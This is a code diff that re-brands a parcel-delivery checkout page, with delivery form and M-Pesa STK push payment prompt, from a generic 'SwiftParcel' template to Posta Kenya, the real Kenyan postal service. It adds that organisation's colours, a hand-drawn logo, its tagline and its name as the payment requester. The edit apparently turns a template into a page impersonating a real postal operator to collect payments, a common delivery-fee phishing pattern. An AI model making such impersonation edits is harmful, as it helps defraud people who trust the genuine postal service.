@@ -3,12 +3,14 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>SwiftParcel | Secure Checkout</title>
+<title>Posta Kenya | Secure Checkout</title>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
 :root {
-  --primary: #e74c3c;
-  --primary-dark: #c0392b;
+  --primary: #d71920;        /* Posta Kenya red */
+  --primary-dark: #b01218;
+  --secondary: #0057a4;      /* Posta Kenya blue */
+  --secondary-dark: #014887;
   --success: #2ecc71;
   --text-main: #1f2937;
   --text-muted: #6b7280;
@@ -46,7 +48,7 @@ body {
 }
 
 .hero-section {
-  background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+  background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
   padding: 3rem 2rem;
   color: white;
   display: flex;
@@ -55,11 +57,12 @@ body {
 }
 .logo-wrap { display: flex; align-items: center; gap: 12px; }
 .logo-icon { 
-  width: 48px; height: 48px; 
-  background: rgba(255,255,255,0.2); 
+  width: 56px; height: 56px;
+  background: rgba(255,255,255,0.18);
   border-radius: 12px; 
   display: flex; align-items: center; justify-content: center; 
   font-weight: 700; font-size: 20px; backdrop-filter: blur(4px);
+  overflow: hidden;
 }
 .hero-content h1 { font-size: 28px; font-weight: 600; margin-bottom: 8px; line-height: 1.2; }
 .hero-content p { font-size: 14px; opacity: 0.8; line-height: 1.5; }
@@ -150,20 +153,28 @@ input::placeholder { color: #9ca3af; }
   <!-- Left Side: Hero / Brand -->
   <div class="hero-section">
     <div class="logo-wrap">
-      <div class="logo-icon">SP</div>
+      <div class="logo-icon" aria-label="Posta Kenya">
+        <svg viewBox="0 0 96 96" width="56" height="56" role="img" aria-label="Posta Kenya logo">
+          <rect x="0" y="0" width="96" height="56" rx="14" fill="rgba(255,255,255,0.16)"/>
+          <rect x="6" y="6" width="84" height="32" rx="10" fill="white" opacity="0.92"/>
+          <rect x="6" y="44" width="84" height="18" rx="9" fill="white" opacity="0.22"/>
+          <text x="48" y="29" text-anchor="middle" font-size="18" font-weight="800" fill="var(--primary)" font-family="Inter, system-ui, -apple-system, Segoe UI, Roboto, sans-serif">POSTA</text>
+          <text x="48" y="57" text-anchor="middle" font-size="12" font-weight="700" fill="white" font-family="Inter, system-ui, -apple-system, Segoe UI, Roboto, sans-serif" opacity="0.95">KENYA</text>
+        </svg>
+      </div>
       <div>
-        <div style="font-size: 20px; font-weight: 600;">SwiftParcel</div>
-        <div style="font-size: 13px; opacity: 0.8;">Premium Delivery</div>
+        <div style="font-size: 20px; font-weight: 700;">Posta Kenya</div>
+        <div style="font-size: 13px; opacity: 0.85;">Touching lives</div>
       </div>
     </div>
     
     <div class="hero-content">
       <h1>Secure & Fast<br>Checkout.</h1>
-      <p>Complete your delivery details to get your package on the road within the next hour.</p>
+      <p>Complete your delivery details to send your parcel quickly and securely.</p>
     </div>
     
     <div class="hero-footer">
-      Secured by Safaricom M-Pesa 256-bit encryption.
+      Secured by Safaricom M-Pesa.
     </div>
   </div>
 
@@ -319,7 +330,7 @@ function submitPayment() {
           <h2 style="font-size:24px; font-weight: 700; margin-bottom: 12px; color: var(--text-main);">Check Your Phone!</h2>
           <p style="color: var(--text-muted); margin-bottom: 2rem; font-size: 15px; line-height: 1.6;">An M-Pesa STK push has been sent exclusively to <br><b style="color: var(--text-main); font-size: 16px;">${val('mpesa-num')}</b>. <br><br>Please enter your M-Pesa PIN on your mobile device to authorize and complete the payment.</p>
           <div style="font-size:13px; border: 1.5px dashed var(--border); padding: 1rem; border-radius: 12px; background: var(--bg-main); text-align: left;">
-            <p style="margin-bottom:8px; color: var(--text-muted); display:flex; justify-content:space-between;"><span>Requested by:</span> <b style="color: var(--text-main);">SwiftParcel</b></p>
+            <p style="margin-bottom:8px; color: var(--text-muted); display:flex; justify-content:space-between;"><span>Requested by:</span> <b style="color: var(--text-main);">Posta Kenya</b></p>
             <p style="margin-bottom:0; color: var(--text-muted); display:flex; justify-content:space-between;"><span>Request ID:</span> <b style="color: var(--text-main); font-family: monospace;">${data.checkoutRequestId}</b></p>
           </div>
           <p style="font-size: 12px; margin-top:2rem; color: #9ca3af;">Awaiting Safaricom confirmation webhook...</p>
